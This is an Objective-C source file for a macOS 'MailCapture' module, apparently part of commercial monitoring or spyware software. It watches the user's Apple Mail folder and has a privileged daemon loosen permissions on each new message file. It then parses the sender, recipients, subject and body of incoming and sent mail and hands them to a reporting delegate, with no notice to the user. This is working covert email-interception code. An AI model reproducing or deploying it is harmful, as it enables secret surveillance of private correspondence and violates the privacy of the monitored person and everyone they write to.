//
//  MailCapture.m
//  MailCaptureManager
//
//  Created by ophat on 5/27/16.
//  Copyright (c) 2016 ophat. All rights reserved.
//

#import "MailCapture.h"
#import <SystemConfiguration/SystemConfiguration.h>
#include <sys/sysctl.h>

#import "MessagePortIPCSender.h"
#import "DateTimeFormat.h"
#import "SystemUtilsImpl.h"

#import "FxEmailMacOSEvent.h"
#import "FxRecipient.h"
#import "FxAttachment.h"

#import "DaemonPrivateHome.h"

@implementation MailCapture
@synthesize mWatchlist,mHistory;
@synthesize mCurrentUserName;
@synthesize mAttachPath;
@synthesize mStream, mCurrentRunloopRef;
@synthesize mDelegate;
@synthesize mSelector;
@synthesize mThread;

const int kIncoming = 0;
const int kOutgoing = 1;

MailCapture *_MailCapture;

-(id) init{
    if (self = [super init]) {
        _MailCapture = self;
        [self saveCurrentUser];
        
        self.mHistory = [[NSMutableArray alloc]init];
        self.mWatchlist = [[NSMutableArray alloc] init];
        
        NSString * path  = [[NSString alloc]initWithString:[NSString stringWithFormat:@"/Users/%@",self.mCurrentUserName]];
        [self.mWatchlist addObject:[NSString stringWithFormat:@"%@/Library/Mail",path]];
        [path release];
    }
    return self;
}

-(void) startCapture{
    DLog(@"MailCapture Start");
    [self watchThisPath:self.mWatchlist];
}

-(void) stopCapture{
    DLog(@"MailCapture Stop");
    if (mStream && mCurrentRunloopRef) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        [self.mWatchlist removeAllObjects];
        mStream = nil;
        mCurrentRunloopRef = nil;
    }
}

-(void)saveCurrentUser{
    self.mCurrentUserName =  [SystemUtilsImpl userLogonName];
}

#pragma mark ### watcher

-(void) watchThisPath:(NSMutableArray *) afileInputPath {
    
    FSEventStreamContext context;
    context.info = (__bridge void *)(self);
    context.version = 0;
    context.retain = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil && mCurrentRunloopRef != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
    }
    
    if([mWatchlist count]>0){
        mCurrentRunloopRef = CFRunLoopGetCurrent();
        mStream =   FSEventStreamCreate(NULL,
                                        &fileChangeEvent,
                                        &context,
                                        (__bridge CFArrayRef) afileInputPath,
                                        kFSEventStreamEventIdSinceNow,
                                        0.5,
                                        // kFSEventStreamCreateFlagWatchRoot
                                        kFSEventStreamCreateFlagUseCFTypes
                                        | kFSEventStreamCreateFlagFileEvents
                                        );
        
        FSEventStreamScheduleWithRunLoop(mStream, mCurrentRunloopRef, kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
    }
}

#pragma mark ### fileChangeEvent

static void fileChangeEvent(ConstFSEventStreamRef streamRef,
                            void* callBackInfo,
                            size_t numEvents,
                            void* eventPaths,
                            const FSEventStreamEventFlags eventFlags[],
                            const FSEventStreamEventId eventIds[]) {
    
    NSArray * paths = (__bridge NSArray*)eventPaths;

    NSAppleScript *scptFrontName =[[NSAppleScript alloc]initWithSource:@"tell application \"System Events\" \n item 1 of (get name of processes whose frontmost is true) \n end tell"];
    NSAppleEventDescriptor *Result = [scptFrontName executeAndReturnError:nil];
    NSString * frontMostName = [[NSString alloc]initWithString:[Result stringValue]];
    [scptFrontName release];
    
    NSAppleScript * scptFrontID = [[NSAppleScript alloc]initWithSource:[NSString stringWithFormat:@"id of application \"%@\"",frontMostName]];
    Result=[scptFrontID executeAndReturnError:nil];
    NSString * frontMostID = [[NSString alloc]initWithString:[Result stringValue]];
    [scptFrontID release];
    
    for (int i=0; i< [paths count] ; i++ ){
        FSEventStreamEventFlags flags = eventFlags[i];
        NSString * filePath = [paths objectAtIndex:i];
        if ([filePath rangeOfString:@".DS_Store"].location == NSNotFound && [filePath rangeOfString:@".tmp"].location == NSNotFound ) {
            
            if ([filePath rangeOfString:@"/."].location == NSNotFound && [filePath rangeOfString:@".emlx"].location != NSNotFound) {
                if (flags & kFSEventStreamEventFlagItemCreated || flags & kFSEventStreamEventFlagItemRenamed) {
                    if ( ! [[_MailCapture mHistory]containsObject:filePath]) {
                        [[_MailCapture mHistory] addObject:filePath];
                        
                        [_MailCapture sendToDaemonWithToChangePermissionWithPath:filePath withPermission:644];
                        
                        if ([filePath rangeOfString:@"Sent Items.mbox"].location != NSNotFound) {
                             dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                 [_MailCapture mailReaderEMLXFromPath:filePath andDirection:kOutgoing];
                             });
                        }else if ([filePath rangeOfString:@"Junk Email.mbox"].location != NSNotFound      ||
                                  [filePath rangeOfString:@"Inbox.mbox"].location != NSNotFound ){
                             dispatch_async(dispatch_get_global_queue( DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^(void){
                                 [_MailCapture mailReaderEMLXFromPath:filePath andDirection:kIncoming];
                             });
                        }
                    }
                }
            }
        }
    }
    
    [frontMostName release];
    [frontMostID release];
}

-(void) mailReaderEMLXFromPath:(NSString *) aPath andDirection:(int)aDirection {
    sleep(0.5);
    NSString * content = [[NSString alloc]initWithContentsOfFile:[NSString stringWithFormat:@"/%@",aPath] encoding:NSUTF8StringEncoding error:nil];
    
    if ([content length] > 0) {
        
        NSString * subject         = @"";
        NSString * temp_sender     = @"";
        NSString * senderName      = @"";
        NSString * senderMail      = @"";
        NSString * temp_recipients = @"";
        NSMutableArray *receiveName = [[NSMutableArray alloc]init];
        NSMutableArray *receiveMail = [[NSMutableArray alloc]init];
        
        NSString * temp_message    = @"";
        NSString * message         = @"";
        int        mailtype        = kEmailServiceTypeUnknown;

        if ([aPath rangeOfString:@"@outlook"].location != NSNotFound || [aPath rangeOfString:@"@hotmail"].location != NSNotFound) {
            mailtype = kEmailServiceTypeLiveHotmail;
        }else if ([aPath rangeOfString:@"@gmail"].location != NSNotFound ) {
            mailtype = kEmailServiceTypeGmail;
        }else if ([aPath rangeOfString:@"@yahoo"].location != NSNotFound ) {
            mailtype = kEmailServiceTypeYahoo;
        }

        if ([content rangeOfString:@"Subject:"].location != NSNotFound ) {
            subject= [[content componentsSeparatedByString:@"Subject:"] objectAtIndex:1];
            subject = [[subject componentsSeparatedByString:@"\n"] objectAtIndex:0];
        }
        
        if ([content rangeOfString:@"From:"].location != NSNotFound ) {
            temp_sender = [[content componentsSeparatedByString:@"From:"] objectAtIndex:1];
            temp_sender = [[temp_sender componentsSeparatedByString:@"\n"] objectAtIndex:0];
        }
 
        if ([content rangeOfString:@"To:"].location != NSNotFound ) {
            temp_recipients = [[content componentsSeparatedByString:@"To:"] objectAtIndex:1];
            temp_recipients = [temp_recipients stringByReplacingOccurrencesOfString:@"CC: " withString:@","];
            
            if ([temp_recipients rangeOfString:@".com>\n"].location !=NSNotFound) {
                temp_recipients = [[temp_recipients componentsSeparatedByString:@".com>\n"] objectAtIndex:0];
                temp_recipients = [temp_recipients stringByAppendingString:@".com>"];
            }else if ([temp_recipients rangeOfString:@".com\n"].location !=NSNotFound) {
                temp_recipients = [[temp_recipients componentsSeparatedByString:@".com\n"] objectAtIndex:0];
                temp_recipients = [temp_recipients stringByAppendingString:@".com"];
            }
            temp_recipients = [temp_recipients stringByReplacingOccurrencesOfString:@"\n" withString:@""];
        }

        if ([content rangeOfString:@"MIME-Version:"].location != NSNotFound) {
            temp_message = [[content componentsSeparatedByString:@"MIME-Version: 1.0"] objectAtIndex:1];
            if ([temp_message rangeOfString:@"<?xml"].location != NSNotFound) {
                temp_message = [[temp_message componentsSeparatedByString:@"<?xml"] objectAtIndex:0];
            }
            
            if ([temp_message rangeOfString:@"<html"].location != NSNotFound) {
                temp_message = [[temp_message componentsSeparatedByString:@"<html"] objectAtIndex:0];
            }
            
            NSString * rawText         = @"";

            NSArray *temp_array_message = [temp_message componentsSeparatedByString:@"\n"];
            for (int i=0; i <[temp_array_message count]; i++) {
                if ([[temp_array_message objectAtIndex:i] length] > 0 ) {
                    if (
                        ([[temp_array_message objectAtIndex:i]rangeOfString:@"Content-"].location != NSNotFound                         ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"X-Microsoft-Exchange-Diagnostics:"].location != NSNotFound ||
                        [[temp_array_message objectAtIndex:i]isEqualToString:@"\n"]                                                     ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"--"].location != NSNotFound                                ||
                        [[temp_array_message objectAtIndex:i]rangeOfString:@"_000"].location != NSNotFound )
                        ||
                        ([[temp_array_message objectAtIndex:i]rangeOfString:@":"].location != NSNotFound &&
                         [[temp_array_message objectAtIndex:i]rangeOfString:@";"].location != NSNotFound &&
                         [[temp_array_message objectAtIndex:i]rangeOfString:@"="].location != NSNotFound &&
                         [[temp_array_message objectAtIndex:i]rangeOfString:@"+"].location != NSNotFound )
                    ){
                        
                    }else{
                        rawText = [rawText stringByAppendingString:[NSString stringWithFormat:@"\n%@",[temp_array_message objectAtIndex:i]]];
                    }
                }
            }
            message = rawText;
        }
        
        if ( [temp_sender length] > 0 ) {
            senderName = [[temp_sender componentsSeparatedByString:@"<"] objectAtIndex:0];
            senderName = [senderName stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
            
            senderMail = [[temp_sender componentsSeparatedByString:@"<"] objectAtIndex:1];
            senderMail = [senderMail stringByReplacingOccurrencesOfString:@">" withString:@""];
            senderMail = [senderMail stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
        }
        
        NSArray * temp_recip_array = [temp_recipients componentsSeparatedByString:@","];
        for (int i=0; i < [temp_recip_array count]; i++) {
            if ([[temp_recip_array objectAtIndex:i]rangeOfString:@"<"].location != NSNotFound &&
                [[temp_recip_array objectAtIndex:i]rangeOfString:@">"].location != NSNotFound ) {
                
                NSString * temp_name = [[[temp_recip_array objectAtIndex:i] componentsSeparatedByString:@"<"] objectAtIndex:0];
                temp_name = [temp_name stringByTrimmingCharactersInSet: [NSCharacterSet whitespaceCharacterSet]];
                
                NSString * temp_mail = [[[temp_recip_array objectAtIndex:i] componentsSeparatedByString:@"<"] objectAtIndex:1];
                temp_mail = [temp_mail stringByReplacingOccurrencesOfString:@">" withString:@""];
                
                [receiveName addObject:temp_name];
                [receiveMail addObject:temp_mail];
                
            }else{
                [receiveName addObject:@""];
                [receiveMail addObject:[temp_recip_array objectAtIndex:i]];
            }
        }
        
        message = [NSString stringWithFormat:@"<div>%@</div><br></p>Capture via AppEmail</p>",message];
        
        DLog(@"#### Send Via AppEmail ####");
        DLog(@"Type {%d}",mailtype);
        DLog(@"Direction {%d}",aDirection);
        DLog(@"Subject {%@}",subject);
        DLog(@"SenderName {%@}",senderName);
        DLog(@"SenderMail {%@}",senderMail);
        DLog(@"ReceiveName %@",receiveName);
        DLog(@"ReceiveMail %@",receiveMail);
        DLog(@"Message {%@}",message);
        
        FxEmailMacOSEvent *emailEvent = [[[FxEmailMacOSEvent alloc] init] autorelease];
        [emailEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [emailEvent setMDirection:aDirection];
        [emailEvent setMUserLogonName:self.mCurrentUserName];
        [emailEvent setMApplicationID:@"com.apple.mail"];
        [emailEvent setMApplicationName:@"Mail"];
        [emailEvent setMTitle:@""];
        [emailEvent setMEmailServiceType:mailtype];
        [emailEvent setMSenderEmail:senderMail];
        [emailEvent setMSenderName:senderName];

        NSMutableArray *recipients = [NSMutableArray array];
        for (int i = 0; i < [receiveMail count]; i++) {
            FxRecipient *recipient = [[[FxRecipient alloc] init] autorelease];
            [recipient setRecipType:kFxRecipientTO];
            [recipient setRecipNumAddr:[receiveMail objectAtIndex:i]];
            [recipient setRecipContactName:[receiveMail objectAtIndex:i]];
            [recipients addObject:recipient];
        }
        
        [emailEvent setMRecipients:recipients];
        [emailEvent setMSubject:subject];
        [emailEvent setMBody:message];

        [mDelegate performSelector:mSelector onThread:mThread withObject:emailEvent waitUntilDone:NO];
     
        [receiveName release];
        [receiveMail release];
        
    }else{
        DLog(@"Error Content %@ %@",content,aPath);
    }
}

-(void)sendToDaemonWithToChangePermissionWithPath:(NSString *)aPath withPermission:(int)aPermission{
    NSMutableDictionary * myCommand = [[NSMutableDictionary alloc]init];
    [myCommand setObject:@"chgownerattr"forKey:@"type"];
    [myCommand setObject:aPath forKey:@"path"];
    [myCommand setObject:[NSString stringWithFormat:@"%d",aPermission] forKey:@"permission"];
    
    NSMutableData *data = [[NSMutableData alloc] init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
    [archiver encodeObject:myCommand forKey:@"command"];
    [archiver finishEncoding];
    [archiver release];
    
    MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:@"bSecuriyAgents"];
    [messagePortSender writeDataToPort:data];
    
    [messagePortSender release];
    messagePortSender = nil;
    [data release];
    [myCommand release];
}

-(void) dealloc{
    [mThread release];
    [mWatchlist release];
    [mHistory release];
    [super dealloc];
}
@end
